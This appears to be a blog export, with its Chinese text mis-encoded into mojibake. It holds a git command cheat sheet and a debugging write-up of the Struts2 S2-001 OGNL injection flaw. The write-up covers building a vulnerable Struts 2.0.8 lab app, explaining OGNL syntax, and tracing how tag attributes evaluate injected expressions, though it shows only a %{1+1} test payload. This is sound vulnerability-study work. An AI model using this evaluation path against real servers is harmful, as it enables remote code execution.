æ€»ç»“123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129git branch æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰åˆ†æ”¯git status æŸ¥çœ‹å½“å‰çŠ¶æ€git commit æäº¤git branch -a æŸ¥çœ‹æ‰€æœ‰çš„åˆ†æ”¯git branch -r æŸ¥çœ‹è¿œç¨‹æ‰€æœ‰åˆ†æ”¯git commit -am &quot;init&quot; æäº¤å¹¶ä¸”åŠ æ³¨é‡Šgit remote add origin git@192.168.1.119:ndshowgit push origin master å°†æ–‡ä»¶ç»™æ¨åˆ°æœåŠ¡å™¨ä¸Šgit remote show origin æ˜¾ç¤ºè¿œç¨‹åº“originé‡Œçš„èµ„æºgit push origin master:developgit push origin master:hb-dev å°†æœ¬åœ°åº“ä¸æœåŠ¡å™¨ä¸Šçš„åº“è¿›è¡Œå…³è”git checkout --track origin/dev åˆ‡æ¢åˆ°è¿œç¨‹devåˆ†æ”¯git branch -D master develop åˆ é™¤æœ¬åœ°åº“developgit checkout -b dev å»ºç«‹ä¸€ä¸ªæ–°çš„æœ¬åœ°åˆ†æ”¯devgit merge origin/dev å°†åˆ†æ”¯devä¸å½“å‰åˆ†æ”¯è¿›è¡Œåˆå¹¶git checkout dev åˆ‡æ¢åˆ°æœ¬åœ°devåˆ†æ”¯git remote show æŸ¥çœ‹è¿œç¨‹åº“git add .git rm æ–‡ä»¶å(åŒ…æ‹¬è·¯å¾„) ä»gitä¸­åˆ é™¤æŒ‡å®šæ–‡ä»¶git clone git://github.com/schacon/grit.git ä»æœåŠ¡å™¨ä¸Šå°†ä»£ç ç»™æ‹‰ä¸‹æ¥git config --list çœ‹æ‰€æœ‰ç”¨æˆ·git ls-files çœ‹å·²ç»è¢«æäº¤çš„git rm [file name] åˆ é™¤ä¸€ä¸ªæ–‡ä»¶git commit -a æäº¤å½“å‰reposçš„æ‰€æœ‰çš„æ”¹å˜git add [file name] æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åˆ°git indexgit commit -v å½“ä½ ç”¨ï¼vå‚æ•°çš„æ—¶å€™å¯ä»¥çœ‹commitçš„å·®å¼‚git commit -m &quot;This is the message describing the commit&quot; æ·»åŠ commitä¿¡æ¯git commit -a -aæ˜¯ä»£è¡¨addï¼ŒæŠŠæ‰€æœ‰çš„changeåŠ åˆ°git indexé‡Œç„¶åå†commitgit commit -a -v ä¸€èˆ¬æäº¤å‘½ä»¤git log çœ‹ä½ commitçš„æ—¥å¿—git diff æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ›´æ–°git rm a.a ç§»é™¤æ–‡ä»¶(ä»æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­åˆ é™¤)git rm --cached a.a ç§»é™¤æ–‡ä»¶(åªä»æš‚å­˜åŒºä¸­åˆ é™¤)git commit -m &quot;remove&quot; ç§»é™¤æ–‡ä»¶(ä»Gitä¸­åˆ é™¤)git rm -f a.a å¼ºè¡Œç§»é™¤ä¿®æ”¹åæ–‡ä»¶(ä»æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­åˆ é™¤)git diff --cached æˆ– $ git diff --staged æŸ¥çœ‹å°šæœªæäº¤çš„æ›´æ–°git stash push å°†æ–‡ä»¶ç»™pushåˆ°ä¸€ä¸ªä¸´æ—¶ç©ºé—´ä¸­git stash pop å°†æ–‡ä»¶ä»ä¸´æ—¶ç©ºé—´popä¸‹æ¥ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼git remote add origin git@github.com:username/Hello-World.gitgit push origin master å°†æœ¬åœ°é¡¹ç›®ç»™æäº¤åˆ°æœåŠ¡å™¨ä¸­ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼git pull æœ¬åœ°ä¸æœåŠ¡å™¨ç«¯åŒæ­¥ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼git push (è¿œç¨‹ä»“åº“å) (åˆ†æ”¯å) å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°æœåŠ¡å™¨ä¸Šå»ã€‚git push origin server fix:awesome branchï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼git fetch ç›¸å½“äºæ˜¯ä»è¿œç¨‹è·å–æœ€æ–°ç‰ˆæœ¬åˆ°æœ¬åœ°ï¼Œä¸ä¼šè‡ªåŠ¨mergegit commit -a -m &quot;log_message&quot; (-aæ˜¯æäº¤æ‰€æœ‰æ”¹åŠ¨ï¼Œ-mæ˜¯åŠ å…¥logä¿¡æ¯) æœ¬åœ°ä¿®æ”¹åŒæ­¥è‡³æœåŠ¡å™¨ç«¯ ï¼šgit branch branch_0.1 master ä»ä¸»åˆ†æ”¯masteråˆ›å»ºbranch_0.1åˆ†æ”¯git branch -m branch_0.1 branch_1.0 å°†branch_0.1é‡å‘½åä¸ºbranch_1.0git checkout branch_1.0/master åˆ‡æ¢åˆ°branch_1.0/masteråˆ†æ”¯du -hsgit branch åˆ é™¤è¿œç¨‹branchgit push origin:branch_remote_namegit branch -r -d branch_remote_nameï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼åˆå§‹åŒ–ç‰ˆæœ¬åº“ï¼Œå¹¶æäº¤åˆ°è¿œç¨‹æœåŠ¡å™¨ç«¯mkdir WebAppcd WebAppgit initæœ¬åœ°åˆå§‹åŒ–touch READMEgit add READMEæ·»åŠ æ–‡ä»¶git commit -m &apos;first commit&apos;git remote add origin git@github.com:patrilic/test.gitå¢åŠ ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨ç«¯","categories":[{"name":"Skills","slug":"Skills","permalink":"http://patrilic.top/categories/Skills/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://patrilic.top/tags/Git/"}]},{"title":"S2-001 è°ƒè¯•æ—¥è®°","slug":"S2-001 è°ƒè¯•æ—¥è®°","date":"2019-08-14T18:11:50.000Z","updated":"2019-08-20T15:29:42.177Z","comments":true,"path":"2019/08/15/S2-001 è°ƒè¯•æ—¥è®°/","link":"","permalink":"http://patrilic.top/2019/08/15/S2-001 è°ƒè¯•æ—¥è®°/","excerpt":"","text":"@ Author: Patrilic@ Time: 2019-8-15 02:11:50 0x00 å‰è¨€å¤ªèœäº†ï¼Œé©¬ä¸Šè¿›å…¥å¤§ä¸‰äº†ï¼Œæœ€è¿‘javaçš„ä¸­é—´ä»¶ä¹Ÿé™†é™†ç»­ç»­çš„çˆ†äº†å¾ˆå¤šæ´ï¼Œç„¶åä¹‹å‰ä¹Ÿç»å¸¸æ¥è§¦ç±»ä¼¼äºWeblogicååºåˆ—åŒ–ã€struts2å‘½ä»¤æ‰§è¡Œä¹‹ç±»çš„æ¼æ´ã€‚å€Ÿç€é‡åˆ·äº†ä¸€éFate Stay Night 06ç‰ˆï¼Œç¡ä¸ç€è§‰ï¼Œå¹²è„†å°±æ¥å¼€å§‹äººç”Ÿä¸­ç¬¬ä¸€ä¸ªS2æ¼æ´åˆ†æ 0x01 æ¼æ´é“¾æ¥https://cwiki.apache.org/confluence/display/WW/S2-001å½±å“ç‰ˆæœ¬ï¼š WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 0x02 ç¯å¢ƒæ­å»ºstruts2åŒ…ä¸‹è½½åœ°å€ï¼šhttp://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip æ­å»ºå¹³å°ï¼š MacOS Mojave 10.14.5ä½¿ç”¨å·¥å…·ï¼š IntelliJ IDEATomcatç‰ˆæœ¬ï¼šApache Tomcat 8.5.16 - MxSrvsè‡ªå¸¦ é¦–å…ˆNewä¸€ä¸ªProject å°†éœ€è¦çš„jaråŒ…æ”¾å…¥/WEB-INF/libç›®å½•ä¸‹12345commons-logging-1.0.4.jarfreemarker-2.3.8.jarognl-2.6.11.jarstruts2-core-2.0.8.jarxwork-2.0.3.jar åˆ›å»ºindex.jspæ–‡ä»¶12345678910111213141516171819&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;S2-001 Demo&lt;/h2&gt;&lt;p&gt;link: &lt;a href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;&lt;s:form action=\"login\"&gt; &lt;s:textfield name=\"username\" label=\"username\" /&gt; &lt;s:textfield name=\"password\" label=\"password\" /&gt; &lt;s:submit&gt;&lt;/s:submit&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; åˆ›å»ºwelcome.jspæ–‡ä»¶12345678910111213&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello &lt;s:property value=\"username\"&gt;&lt;/s:property&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; åœ¨srcç›®å½•ä¸‹åˆ›å»ºPackage com.demo.actionç„¶ååˆ›å»ºclass1234567891011121314151617181920212223242526272829303132333435package com.demo.action;import com.opensymphony.xwork2.ActionSupport;public class LoginAction extends ActionSupport &#123; private String username = null; private String password = null; public String getUsername() &#123; return this.username; &#125; public String getPassword() &#123; return this.password; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String execute() throws Exception &#123; if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123; return \"error\"; &#125; if ((this.username.equalsIgnoreCase(\"admin\")) &amp;&amp; (this.password.equals(\"admin\"))) &#123; return \"success\"; &#125; return \"error\"; &#125;&#125; å¯¼å…¥åŒ…File-&gt;Project Structure ç„¶åè®¾ç½®å¥½tomcaté…ç½®å°±å¯ä»¥Runäº† å¦‚æœé‡åˆ°java.lang.IllegalStateException: struts.properties missingçš„é—®é¢˜æ£€æŸ¥ä¸€ä¸‹è‡ªå·±åˆ›å»ºçš„åŒ…åæˆ–è€…ç±»åæ˜¯å¦ä¸struts.xmlä¸­é…ç½®çš„ä¸€è‡´ æ¼æ´ç¯å¢ƒå°±å·²ç»æ­å¥½äº† 0x03 OGNLè¡¨è¾¾å¼åŸºæœ¬æ¦‚å¿µ OGNLæ˜¯Object-Graph Navigation Languageçš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼Œç®€ç§°ä¸ºELï¼‰ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚ â€”â€”-ç™¾åº¦ç™¾ç§‘ OGNLçš„ä¸‰è¦ç´ ï¼š ä¸€ã€è¡¨è¾¾å¼ï¼š è¡¨è¾¾å¼ï¼ˆExpressionï¼‰æ˜¯æ•´ä¸ªOGNLçš„æ ¸å¿ƒå†…å®¹ï¼Œæ‰€æœ‰çš„OGNLæ“ä½œéƒ½æ˜¯é’ˆå¯¹è¡¨è¾¾å¼è§£æåè¿›è¡Œçš„ã€‚é€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰OGNLæ“ä½œåˆ°åº•è¦å¹²äº›ä»€ä¹ˆã€‚å› æ­¤ï¼Œè¡¨è¾¾å¼å…¶å®æ˜¯ä¸€ä¸ªå¸¦æœ‰è¯­æ³•å«ä¹‰çš„å­—ç¬¦ä¸²ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²å°†è§„å®šæ“ä½œçš„ç±»å‹å’Œå†…å®¹ã€‚OGNLè¡¨è¾¾å¼æ”¯æŒå¤§é‡çš„è¡¨è¾¾å¼ï¼Œå¦‚â€œé“¾å¼è®¿é—®å¯¹è±¡â€ã€è¡¨è¾¾å¼è®¡ç®—ã€ç”šè‡³è¿˜æ”¯æŒLambdaè¡¨è¾¾å¼ã€‚ äºŒã€Rootå¯¹è±¡ï¼š OGNLçš„Rootå¯¹è±¡å¯ä»¥ç†è§£ä¸ºOGNLçš„æ“ä½œå¯¹è±¡ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šè¿™ä¸ªè¡¨è¾¾å¼é’ˆå¯¹çš„æ˜¯å“ªä¸ªå…·ä½“çš„å¯¹è±¡ã€‚è€Œè¿™ä¸ªå…·ä½“çš„å¯¹è±¡å°±æ˜¯Rootå¯¹è±¡ï¼Œè¿™å°±æ„å‘³ç€ï¼Œå¦‚æœæœ‰ä¸€ä¸ªOGNLè¡¨è¾¾å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦é’ˆå¯¹Rootå¯¹è±¡æ¥è¿›è¡ŒOGNLè¡¨è¾¾å¼çš„è®¡ç®—å¹¶ä¸”è¿”å›ç»“æœã€‚ ä¸‰ã€ä¸Šä¸‹æ–‡ç¯å¢ƒï¼š æœ‰ä¸ªRootå¯¹è±¡å’Œè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨OGNLè¿›è¡Œç®€å•çš„æ“ä½œäº†ï¼Œå¦‚å¯¹Rootå¯¹è±¡çš„èµ‹å€¼ä¸å–å€¼æ“ä½œã€‚ä½†æ˜¯ï¼Œå®é™…ä¸Šåœ¨OGNLçš„å†…éƒ¨ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ•°æ®ç¯å¢ƒä¸­è¿è¡Œã€‚è¿™ä¸ªæ•°æ®ç¯å¢ƒå°±æ˜¯ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ã€‚OGNLçš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸€ä¸ªMapç»“æ„ï¼Œç§°ä¹‹ä¸ºOgnlContextã€‚Rootå¯¹è±¡ä¹Ÿä¼šè¢«æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­å»ã€‚ Ognlè¡¨è¾¾å¼è¯­è¨€çš„ä½œç”¨jspé¡µé¢å–å€¼ç”¨ELè¡¨è¾¾å¼è¯­è¨€ï¼Œä¹Ÿç”¨äºé¡µé¢å–å€¼ï¼Œæ˜¯jspé¡µé¢å–å€¼çš„æ ‡å‡†ï¼ˆé»˜è®¤å°±å¯ä»¥ä½¿ç”¨ï¼‰Ognlè¡¨è¾¾å¼è¯­è¨€ï¼ŒStrutsæ ‡ç­¾é»˜è®¤æ”¯æŒçš„è¡¨è¾¾å¼è¯­è¨€ï¼Œå¿…é¡»é…ç½®Strutsæ ‡ç­¾ç”¨ï¼Œä¸èƒ½ç¦»å¼€Strutsæ ‡ç­¾ç›´æ¥ä½¿ç”¨ï¼Œå°±æ˜¯è¯´Ognlå¿…é¡»åœ¨Strutsä¸­ä½¿ç”¨å¯¹æ¯”æ¥çœ‹ï¼ŒELä½¿ç”¨èŒƒå›´æ›´å¹¿ï¼Œé¡¹ç›®ä¸­ä¸é™åˆ¶ä½¿ç”¨å“ªä¸€ç§ï¼Œå“ªä¸€ç§ç†Ÿæ‚‰å°±ä½¿ç”¨å“ªä¸€ç§ OGNL çš„åŸºæœ¬è¯­æ³• å¯¹Rootå¯¹è±¡çš„è®¿é—®OGNLä½¿ç”¨çš„æ˜¯ä¸€ç§é“¾å¼çš„é£æ ¼è¿›è¡Œå¯¹è±¡çš„è®¿é—® 12User user = new User(\"rcx\", \"123\");System.out.println(Ognl.getValue(\"name\", user)); å¯¹ä¸Šä¸‹æ–‡å¯¹è±¡çš„è®¿é—®ä½¿ç”¨OGNLçš„æ—¶å€™å¦‚æœä¸è®¾ç½®ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°å½“ä¸­åŒ…å«äº†ä¸Šä¸‹æ–‡å¯¹è±¡åˆ™ä¼šä½¿ç”¨ä¼ å…¥çš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚å½“è®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­çš„å‚æ•°æ—¶å€™ï¼Œéœ€è¦åœ¨è¡¨è¾¾å¼å‰é¢åŠ ä¸Šâ€™#â€™ï¼Œè¡¨ç¤ºäº†ä¸è®¿é—®Rootå¯¹è±¡çš„åŒºåˆ« 1234User user = new User(\"rcx\", \"123\");Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();context.put(\"user\", user);System.out.println(Ognl.getValue(\"#user.name\", context, user)); å¯¹é™æ€å˜é‡çš„è®¿é—®åœ¨OGNLè¡¨è¾¾å¼å½“ä¸­ä¹Ÿå¯ä»¥è®¿é—®é™æ€å˜é‡æˆ–è€…è°ƒç”¨é™æ€æ–¹æ³•ï¼Œæ ¼å¼å¦‚@[class]@[field/method()]ã€‚ 12Object object = Ognl.getValue(\"@com.rcx.ognl.Constant@ONE\", null);System.out.println(object); æ–¹æ³•çš„è°ƒç”¨å¦‚æœéœ€è¦è°ƒç”¨Rootå¯¹è±¡æˆ–è€…ä¸Šä¸‹æ–‡å¯¹è±¡å½“ä¸­çš„æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨.+æ–¹æ³•çš„æ–¹å¼æ¥è°ƒç”¨ã€‚ç”šè‡³å¯ä»¥ä¼ å…¥å‚æ•°ã€‚ 12345678User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();context.put(\"name\", \"rcx\");context.put(\"password\", \"password\");System.out.println(Ognl.getValue(\"getName()\", context, user));Ognl.getValue(\"setName(#name)\", context, user);System.out.println(Ognl.getValue(\"getName()\", context, user)); å¯¹æ•°ç»„å’Œé›†åˆçš„è®¿é—®OGNLæ”¯æŒå¯¹æ•°ç»„æŒ‰ç…§æ•°ç»„ä¸‹æ ‡çš„é¡ºåºè¿›è¡Œè®¿é—®ã€‚æ­¤æ–¹å¼ä¹Ÿé€‚ç”¨äºå¯¹é›†åˆçš„è®¿é—®ï¼Œå¯¹äºMapæ”¯æŒä½¿ç”¨é”®è¿›è¡Œè®¿é—® 1234567891011121314151617181920User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();String[] strings = &#123;\"aa\", \"bb\"&#125;;ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();list.add(\"aa\");list.add(\"bb\");Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();map.put(\"key1\", \"value1\");map.put(\"key2\", \"value2\");context.put(\"list\", list);context.put(\"strings\", strings);context.put(\"map\", map);try&#123; System.out.println(Ognl.getValue(\"#strings[0]\", context, user)); System.out.println(Ognl.getValue(\"#list[0]\", context, user)); System.out.println(Ognl.getValue(\"#list[0 + 1]\", context, user)); System.out.println(Ognl.getValue(\"#map['key1']\", context, user)); System.out.println(Ognl.getValue(\"#map['key' + '2']\", context, user)); &#125; ... æŠ•å½±ä¸é€‰æ‹©OGNLæ”¯æŒç±»ä¼¼æ•°æ®åº“å½“ä¸­çš„é€‰æ‹©ä¸æŠ•å½±åŠŸèƒ½ã€‚æŠ•å½±ï¼šé€‰å‡ºé›†åˆå½“ä¸­çš„ç›¸åŒå±æ€§ç»„åˆæˆä¸€ä¸ªæ–°çš„é›†åˆã€‚è¯­æ³•ä¸ºcollection.{XXX}ï¼ŒXXXå°±æ˜¯é›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„å…¬å…±å±æ€§ã€‚ é€‰æ‹©ï¼šé€‰æ‹©å°±æ˜¯é€‰æ‹©å‡ºé›†åˆå½“ä¸­ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ç»„åˆæˆæ–°çš„é›†åˆã€‚è¯­æ³•ä¸ºcollection.{Y XXX}ï¼Œå…¶ä¸­Yæ˜¯ä¸€ä¸ªé€‰æ‹©æ“ä½œç¬¦ï¼ŒXXXæ˜¯é€‰æ‹©ç”¨çš„é€»è¾‘è¡¨è¾¾å¼ã€‚ é€‰æ‹©æ“ä½œç¬¦æœ‰3ç§ï¼š ? ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å…ƒç´  ^ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå…ƒç´  $ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€åä¸€ä¸ªå…ƒç´  12345678Person p1 = new Person(1, \"name1\");Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();ArrayList&lt;Person&gt; list = new ArrayList&lt;Person&gt;();list.add(p1);context.put(\"list\", list);ArrayList&lt;Integer&gt; list2 = (ArrayList&lt;Integer&gt;) Ognl.getValue(\"#list.&#123;id&#125;\",context,list);System.out.println(list2); åˆ›å»ºå¯¹è±¡OGNLæ”¯æŒç›´æ¥ä½¿ç”¨è¡¨è¾¾å¼æ¥åˆ›å»ºå¯¹è±¡ã€‚ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼šæ„é€ Listå¯¹è±¡ï¼šä½¿ç”¨{},ä¸­é—´ä½¿ç”¨â€™,â€™è¿›è¡Œåˆ†å‰²å¦‚{â€œaaâ€, â€œbbâ€, â€œccâ€}æ„é€ Mapå¯¹è±¡ï¼šä½¿ç”¨#{}ï¼Œä¸­é—´ä½¿ç”¨â€™,è¿›è¡Œåˆ†å‰²é”®å€¼å¯¹ï¼Œé”®å€¼å¯¹ä½¿ç”¨â€™:â€™åŒºåˆ†ï¼Œå¦‚#{â€œkey1â€ : â€œvalue1â€, â€œkey2â€ : â€œvalue2â€}æ„é€ ä»»æ„å¯¹è±¡ï¼šç›´æ¥ä½¿ç”¨å·²çŸ¥çš„å¯¹è±¡çš„æ„é€ æ–¹æ³•è¿›è¡Œæ„é€ ã€‚ 123456Map&lt;String, String&gt; map = (Map&lt;String, String&gt;)Ognl.getValue(\"#&#123;'key1':'value1'&#125;\", null);System.out.println(map);List&lt;String&gt; list = (List&lt;String&gt;)Ognl.getValue(\"&#123;'key1','value1'&#125;\", null);System.out.println(list);Object object = Ognl.getValue(\"new java.lang.Object()\", null);System.out.println(object); 0x04 æ¼æ´éªŒè¯ 0x05 æ¼æ´åˆ†æ Tomcatå®¹å™¨å¤„ç†åï¼Œå°†httpè¯·æ±‚å‘é€è‡³struts2ï¼Œç„¶ååˆ†ä¸¤ä¸ªé˜¶æ®µï¼š ç¬¬ä¸€é˜¶æ®µï¼š St2å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†,è¿™ä¸ªé˜¶æ®µä¸»è¦æ˜¯St2å’Œwebå®¹å™¨æ‰“äº¤é“,æŠŠhttpè¯·æ±‚å°è£…æˆjavaå¯¹è±¡.ä¸ºçœŸæ­£çš„ä¸šåŠ¡é€»è¾‘æ‰§è¡Œåšå¿…è¦çš„æ•°æ®ç¯å¢ƒå’Œè¿è¡Œç¯å¢ƒçš„å‡†å¤‡ ç¬¬äºŒé˜¶æ®µï¼šXWork,æ‰§è¡Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘. é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹æ‹¦æˆªå™¨ javaé‡Œçš„æ‹¦æˆªå™¨æ˜¯åŠ¨æ€æ‹¦æˆªActionè°ƒç”¨çš„å¯¹è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç§æœºåˆ¶å¯ä»¥ä½¿å¼€å‘è€…åœ¨ä¸€ä¸ªActionæ‰§è¡Œçš„å‰åæ‰§è¡Œä¸€æ®µä»£ç ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸€ä¸ªActionæ‰§è¡Œå‰é˜»æ­¢å…¶æ‰§è¡Œï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€ç§å¯ä»¥æå–Actionä¸­å¯é‡ç”¨éƒ¨åˆ†ä»£ç çš„æ–¹å¼ã€‚åœ¨AOPä¸­ï¼Œæ‹¦æˆªå™¨ç”¨äºåœ¨æŸä¸ªæ–¹æ³•æˆ–è€…å­—æ®µè¢«è®¿é—®ä¹‹å‰ï¼Œè¿›è¡Œæ‹¦æˆªç„¶åå†ä¹‹å‰æˆ–è€…ä¹‹ååŠ å…¥æŸäº›æ“ä½œã€‚ç›®å‰ï¼Œæˆ‘ä»¬éœ€è¦æŒæ¡çš„ä¸»è¦æ˜¯Springçš„æ‹¦æˆªå™¨ï¼ŒStruts2çš„æ‹¦æˆªå™¨ä¸ç”¨æ·±ç©¶ï¼ŒçŸ¥é“å³å¯ã€‚ åœ¨struts.xmlé‡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œç„¶ååœ¨struts_defalut.xmlé‡Œèƒ½æ‰¾åˆ°å®ƒæ‹¦æˆªçš„class ç¬¬87è¡Œã€æŠŠä¼ å…¥çš„å‚æ•°æ‰“å…¥åˆ°å€¼æ ˆä¸­,æˆ‘ä»¬åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ç»§ç»­å¾€ä¸‹ï¼Œ97è¡Œï¼Œå¸¦å…¥åˆ°invocation.invoke() ç»§ç»­è·Ÿæ­¥å…¥executeResult() ç„¶åæ­¥å…¥dispatcher.forward() è°ƒè¯•åˆ°è¿™é‡Œåˆåˆ°äº†index.jspç„¶åå°±æ˜¯åœ¨org.apache.struts2.views.jsp.ComponentTagSupportè§£ææ ‡ç­¾ç„¶åæ­¥å…¥evaluateParams()ç»§ç»­æ‰§è¡Œåˆ°altSyntax(),è¿™ä¸ªæ–¹æ³•è¿”å›true,æ ¹æ®https://cwiki.apache.org/confluence/display/WW/Alt+Syntax,altSyntaxé»˜è®¤å¼€å¯,ä¸ºäº†åŠ¨æ€çš„æ”¹å˜æ ‡ç­¾å±æ€§çš„å€¼,å®ƒå…è®¸æ‰§è¡Œæ ‡ç­¾å±æ€§ä¸­çš„OGNLè¡¨è¾¾å¼. åŒæ—¶,ä¸ºäº†ä¸è¿‡å¤šçš„å¼•å…¥å•å¼•å·,å¯ä»¥ä½¿ç”¨â€%{â€¦}â€çš„å½¢å¼æ¥å†™å…¥è¡¨è¾¾å¼. æ­¤åoä¸º%{1+1}ï¼Œå†å¯¹oè¿›è¡Œäº†ä¸€ç•ªå¤„ç†åï¼Œpayloadç»è¿‡resultå˜é‡ï¼Œæœ€ç»ˆæˆä¸ºexpressionçš„å€¼ï¼š æœ€åObject o = stack.findValue(var, asType);æ‰§è¡Œpayload 0x06 æ€»ç»“å…¶å®è¿™ä¸ªæ¼æ´è¿˜æ˜¯æŒºç®€å•çš„ï¼Œå†™çš„å¾ˆä¹±ï¼Œä½†æ˜¯ç¡®å®æ˜¯è·Ÿç€å‡ ç¯‡æ–‡ç« ä¸€æ­¥ä¸€æ­¥è‡ªå·±è·³å‡ºæ¥çš„ï¼Œä¹Ÿç®—æ˜¯ç¬¬ä¸€ä¸ªè°ƒçš„javaæ¼æ´äº†ï¼Œå­¦åˆ°å¾ˆå¤šè°ƒè¯•æŠ€å·§ï¼Œè†œä¸€ä¸‹chybetaå¸ˆå‚….. 0x07 é“¾æ¥https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/ 